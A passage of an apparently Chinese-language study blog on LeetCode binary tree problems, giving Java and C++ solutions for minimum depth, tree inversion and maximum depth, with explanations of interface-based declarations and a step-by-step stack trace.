&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span>  <span class="operator">=</span> queue.size();</span><br><span class="line">            depth++;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">                cur = queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(cur.left == <span class="literal">null</span> &amp;&amp; cur.right == <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> depth;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="literal">null</span>) queue.offer(cur.left);</span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) queue.offer(cur.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> minDepth(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> minDepth(root.right);</span><br><span class="line">        <span class="comment">// 在计算最小深度时，当一个子树为空时，必须沿着另一个非空子树去寻找叶子节点，因为只有到叶子节点的路径才算作深度路径。</span></span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span>) <span class="keyword">return</span> rightDepth + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.right == <span class="literal">null</span>) <span class="keyword">return</span> leftDepth + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Math.min(leftDepth, rightDepth) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">minDepth</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dep(root);</span><br><span class="line">        <span class="keyword">return</span> minDepth == Integer.MAX_VALUE ? <span class="number">0</span> : minDepth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dep</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        depth++;</span><br><span class="line">        dep(root.left);</span><br><span class="line">        dep(root.right);</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)</span><br><span class="line">            minDepth = Math.min(minDepth, depth);</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();</code> 用 <code>Queue</code> 来声明变量，但使用 <code>LinkedList</code> 来实例化它。这种方式在 Java 中是允许的，而且有它的设计意义。</p><ol><li><p><strong>接口与实现分离</strong></p><ul><li><code>Queue</code> 是 Java 中的一个接口（interface），它定义了队列（FIFO，先进先出）的行为规范，比如 <code>offer</code>、<code>poll</code>、<code>peek</code> 等方法。</li><li><code>LinkedList</code> 是一个具体的类，它实现了 <code>Queue</code> 接口，所以 <code>LinkedList</code> 可以被用来作为 <code>Queue</code> 的实现。</li><li>使用接口来声明变量（即 <code>Queue&lt;TreeNode&gt; queue</code>），可以让代码更加灵活。如果你想要更换为不同的队列实现（例如 <code>PriorityQueue</code>），可以直接替换而不改变其他代码。这是面向接口编程的一个基本原则。</li></ul></li><li><p><strong>LinkedList 作为 Queue 的实现</strong></p><ul><li><code>LinkedList</code> 是 Java 中一个双向链表的实现，同时也实现了多个接口，包括 <code>Queue</code> 和 <code>Deque</code>。</li><li>在 <code>Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();</code> 中，声明的是 <code>Queue</code> 类型，但它的实际运行时类型是 <code>LinkedList</code>，因此可以调用 <code>Queue</code> 接口中的方法如 <code>offer</code> 和 <code>poll</code>，它们在 <code>LinkedList</code> 中都有具体的实现。</li></ul></li><li><p><strong>为什么这样做？</strong></p><ul><li>通过 <code>Queue</code> 来声明变量，使得代码的依赖性降低。换句话说，代码只依赖于 <code>Queue</code> 的行为（方法），而不关心它的具体实现。</li><li>这种方式不仅提高了代码的可读性和可维护性，也使得在需要时更容易替换底层的实现类。</li></ul></li></ol><p>代码示例<br>如果以后想替换实现，只需更改实例化部分即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(); <span class="comment">// 假设需要优先队列</span></span><br></pre></td></tr></table></figure><h2 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226.翻转二叉树"></a>226.翻转二叉树</h2><p>翻转一棵二叉树。<br><img src="/2024/10/29/algorithm/binarytree/image-14.png" alt="输入"><br><img src="/2024/10/29/algorithm/binarytree/image-15.png" alt="输出"><br><a href="https://www.programmercarl.com/0226.%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91.html#%E6%80%9D%E8%B7%AF">https://www.programmercarl.com/0226.%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91.html#%E6%80%9D%E8%B7%AF</a></p><p>递归的中序遍历是不行的，因为使用递归的中序遍历，某些节点的左右孩子会翻转两次。<br>如果非要使用递归中序的方式写，也可以，如下代码就可以避免节点左右孩子翻转两次的情况：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="built_in">invertTree</span>(root-&gt;left);         <span class="comment">// 左</span></span><br><span class="line">        <span class="built_in">swap</span>(root-&gt;left, root-&gt;right);  <span class="comment">// 中</span></span><br><span class="line">        <span class="built_in">invertTree</span>(root-&gt;left);         <span class="comment">// 注意 这里依然要遍历左孩子，因为中间节点已经翻转了</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>代码虽然可以，但这毕竟不是真正的递归中序遍历了。但使用迭代方式统一写法的中序是可以的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) st.<span class="built_in">push</span>(node-&gt;right);  <span class="comment">// 右</span></span><br><span class="line">                st.<span class="built_in">push</span>(node);                          <span class="comment">// 中</span></span><br><span class="line">                st.<span class="built_in">push</span>(<span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) st.<span class="built_in">push</span>(node-&gt;left);    <span class="comment">// 左</span></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                node = st.<span class="built_in">top</span>();</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="built_in">swap</span>(node-&gt;left, node-&gt;right);          <span class="comment">// 节点处理逻辑</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>假设我们有如下二叉树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \</span><br><span class="line">4   5</span><br></pre></td></tr></table></figure><p>这棵树的目标是要翻转每个节点的左右子树。翻转后应该变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">3   2</span><br><span class="line">   / \</span><br><span class="line">  5   4</span><br></pre></td></tr></table></figure><p>接下来，我们按照代码的执行逻辑一步一步地展示栈的变化过程。</p><h3 id="初始状态"><a href="#初始状态" class="headerlink" title="初始状态"></a>初始状态</h3><ul><li>栈初始化并将根节点 <code>1</code> 压入栈中。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [1]</span><br></pre></td></tr></table></figure><h3 id="第一步：处理节点-1"><a href="#第一步：处理节点-1" class="headerlink" title="第一步：处理节点 1"></a>第一步：处理节点 1</h3><ul><li>弹出节点 <code>1</code>，因为它不为空，按照右-中-左顺序进行压栈。<ul><li>将 <code>1</code> 的右子节点 <code>3</code> 压入栈。</li><li>将节点 <code>1</code> 本身压入栈。</li><li>压入 <code>NULL</code> 标记。</li><li>将 <code>1</code> 的左子节点 <code>2</code> 压入栈。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 2]</span><br></pre></td></tr></table></figure><h3 id="第二步：处理节点-2"><a href="#第二步：处理节点-2" class="headerlink" title="第二步：处理节点 2"></a>第二步：处理节点 2</h3><ul><li>弹出节点 <code>2</code>，因为它不为空，按照右-中-左顺序进行压栈。<ul><li>将 <code>2</code> 的右子节点 <code>5</code> 压入栈。</li><li>将节点 <code>2</code> 本身压入栈。</li><li>压入 <code>NULL</code> 标记。</li><li>将 <code>2</code> 的左子节点 <code>4</code> 压入栈。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 5, 2, NULL, 4]</span><br></pre></td></tr></table></figure><h3 id="第三步：处理节点-4"><a href="#第三步：处理节点-4" class="headerlink" title="第三步：处理节点 4"></a>第三步：处理节点 4</h3><ul><li>弹出节点 <code>4</code>，它没有子节点。<ul><li>将节点 <code>4</code> 本身压入栈。</li><li>压入 <code>NULL</code> 标记。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 5, 2, NULL, 4, NULL]</span><br></pre></td></tr></table></figure><h3 id="第四步：处理空标记（处理节点-4）"><a href="#第四步：处理空标记（处理节点-4）" class="headerlink" title="第四步：处理空标记（处理节点 4）"></a>第四步：处理空标记（处理节点 4）</h3><ul><li>遇到 <code>NULL</code> 标记，弹出 <code>NULL</code> 并获取节点 <code>4</code>。</li><li>对 <code>4</code> 进行翻转，但 <code>4</code> 没有子节点，结构保持不变。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 5, 2, NULL]</span><br></pre></td></tr></table></figure><h3 id="第五步：处理节点-5"><a href="#第五步：处理节点-5" class="headerlink" title="第五步：处理节点 5"></a>第五步：处理节点 5</h3><ul><li>弹出节点 <code>5</code>，它没有子节点。<ul><li>将节点 <code>5</code> 本身压入栈。</li><li>压入 <code>NULL</code> 标记。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 5, NULL]</span><br></pre></td></tr></table></figure><h3 id="第六步：处理空标记（处理节点-5）"><a href="#第六步：处理空标记（处理节点-5）" class="headerlink" title="第六步：处理空标记（处理节点 5）"></a>第六步：处理空标记（处理节点 5）</h3><ul><li>遇到 <code>NULL</code> 标记，弹出 <code>NULL</code> 并获取节点 <code>5</code>。</li><li>对 <code>5</code> 进行翻转，但 <code>5</code> 没有子节点，结构保持不变。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL]</span><br></pre></td></tr></table></figure><h3 id="第七步：处理空标记（处理节点-2）"><a href="#第七步：处理空标记（处理节点-2）" class="headerlink" title="第七步：处理空标记（处理节点 2）"></a>第七步：处理空标记（处理节点 2）</h3><ul><li>遇到 <code>NULL</code> 标记，弹出 <code>NULL</code> 并获取节点 <code>2</code>。</li><li>对 <code>2</code> 进行翻转，使得 <code>5</code> 成为左子节点，<code>4</code> 成为右子节点。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3]</span><br></pre></td></tr></table></figure><h3 id="第八步：处理节点-3"><a href="#第八步：处理节点-3" class="headerlink" title="第八步：处理节点 3"></a>第八步：处理节点 3</h3><ul><li>弹出节点 <code>3</code>，它没有子节点。<ul><li>将节点 <code>3</code> 本身压入栈。</li><li>压入 <code>NULL</code> 标记。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, NULL]</span><br></pre></td></tr></table></figure><h3 id="第九步：处理空标记（处理节点-3）"><a href="#第九步：处理空标记（处理节点-3）" class="headerlink" title="第九步：处理空标记（处理节点 3）"></a>第九步：处理空标记（处理节点 3）</h3><ul><li>遇到 <code>NULL</code> 标记，弹出 <code>NULL</code> 并获取节点 <code>3</code>。</li><li>对 <code>3</code> 进行翻转，但 <code>3</code> 没有子节点，结构保持不变。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: []</span><br></pre></td></tr></table></figure><h3 id="第十步：处理空标记（处理节点-1）"><a href="#第十步：处理空标记（处理节点-1）" class="headerlink" title="第十步：处理空标记（处理节点 1）"></a>第十步：处理空标记（处理节点 1）</h3><ul><li>遇到 <code>NULL</code> 标记，弹出 <code>NULL</code> 并获取节点 <code>1</code>。</li><li>对 <code>1</code> 进行翻转，使得 <code>3</code> 成为左子节点，<code>2</code> 成为右子节点。</li></ul><h3 id="最终结构"><a href="#最终结构" class="headerlink" title="最终结构"></a>最终结构</h3><p>现在树已完全翻转，得到的树结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">3   2</span><br><span class="line">   / \</span><br><span class="line">  5   4</span><br></pre></td></tr></table></figure><p>这样通过一步步地栈操作，我们成功地翻转了这棵二叉树。每次遇到 <code>NULL</code> 标记时，栈顶的节点都可以安全地进行左右子节点的交换，直到栈为空。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// DFS递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        invertTree(root.right);</span><br><span class="line">        swapChildren(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swapChildren</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayDeque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            <span class="keyword">while</span>(size-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.poll();</span><br><span class="line">                swap(node);</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>) deque.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) deque.offer(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="104-二叉树的最大深度-1"><a href="#104-二叉树的最大深度-1" class="headerlink" title="104.二叉树的最大深度"></a>104.二叉树的最大深度</h2><p>给定一个二叉树，找出其最大深度。<br>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。<br>说明: 叶子节点是指没有子节点的节点。</p><p>在二叉树的遍历中，<strong>前序遍历</strong>和<strong>后序遍历</strong>有不同的应用场景，特别是在计算树的<strong>深度</strong>和<strong>高度</strong>时：</p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h3 id="1-深度（Depth）与前序遍历"><a href="#1-深度（Depth）与前序遍历" class="headerlink" title="1. 深度（Depth）与前序遍历"></a>1. <strong>深度（Depth）与前序遍历</strong></h3><ul><li><strong>前序遍历（中左右）</strong>的顺序意味着我们从根节点开始逐层深入，这与深度的定义相契合。</li><li>在递归实现中，我们在每个节点递归进入其子节点时，都可以累计当前的深度值。</li><li>因此，前序遍历常用于计算<strong>深度</strong>，即从根节点到叶节点的最长路径。</li><li>例如，在遍历中不断向下递归时，我们能够计算并更新树的<strong>最大深度</strong>或是找到二叉树的<strong>最小深度</strong>。</li></ul><h3 id="2-高度（Height）与后序遍历"><a href="#2-高度（Height）与后序遍历" class="headerlink" title="2. 高度（Height）与后序遍历"></a>2. <strong>高度（Height）与后序遍历</strong></h3><ul><li><strong>后序遍历（左右中）</strong>的顺序则是从子节点回溯到父节点。</li><li>在计算高度时，这种遍历顺序最为合理，因为树的<strong>高度</strong>定义为“节点到叶节点最长路径的长度”，而要计算高度，就需要先知道子节点的高度，然后取左右子树的最大高度，再加 1。</li><li>例如，当递归返回到父节点时，可以利用左右子树的高度来计算当前节点的高度。因此，后序遍历可以很好地用于计算<strong>树的高度</strong>。</li></ul><h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p>假设我们有这样一棵二叉树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \</span><br><span class="line">4   5</span><br></pre></td></tr></table></figure><h4 id="用前序遍历计算深度"><a href="#用前序遍历计算深度" class="headerlink" title="用前序遍历计算深度"></a>用前序遍历计算深度</h4><ul><li>我们从根节点 <code>1</code> 出发，逐步递归到每一层的叶节点，在每次进入下一层时更新当前深度。</li><li>比如这棵树的最大深度是 <code>3</code>（从根节点 <code>1</code> 到叶节点 <code>4</code> 或 <code>5</code>）。</li></ul><h4 id="用后序遍历计算高度"><a href="#用后序遍历计算高度" class="headerlink" title="用后序遍历计算高度"></a>用后序遍历计算高度</h4><ul><li>在后序遍历中，首先递归到叶节点 <code>4</code> 和 <code>5</code>，然后回溯到节点 <code>2</code>，可以计算出 <code>4</code> 和 <code>5</code> 的高度，然后得出节点 <code>2</code> 的高度，再回溯到根节点。</li><li>最终树的高度也是 <code>3</code>，因为从叶节点 <code>4</code> 或 <code>5</code> 到根节点 <code>1</code> 的最长路径长度为 <code>3</code>。</li></ul><p>根节点的高度就是二叉树的最大深度，所以本题中我们通过后序求的根节点高度来求的二叉树最大深度。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>使用迭代法的话，使用层序遍历是最为合适的，因为最大的深度就是二叉树的层数，和层序遍历的方式极其吻合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Queue&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        que.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> que.size();</span><br><span class="line">            <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> que.poll();</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>) que.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) que.offer(node.right);</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line">            depth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用递归</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> maxDepth(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> maxDepth(root.right);</span><br><span class="line">        <span class="keyword">return</span> Math.max(leftDepth ,rightDepth)+<span class="number">1</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxnum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        ans(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> maxnum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">ans</span><span class="params">(TreeNode tr, <span class="type">int</span> tmp)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(tr == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        tmp++;</span><br><span class="line">        maxnum = maxnum &lt; tmp ? tmp : maxnum;</span><br><span class="line">        ans(tr.left, tmp);</span><br><span class="line">        ans(tr.right, tmp);</span><br><span class="line">        tmp--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="222-完全二叉树的节点个数"><a 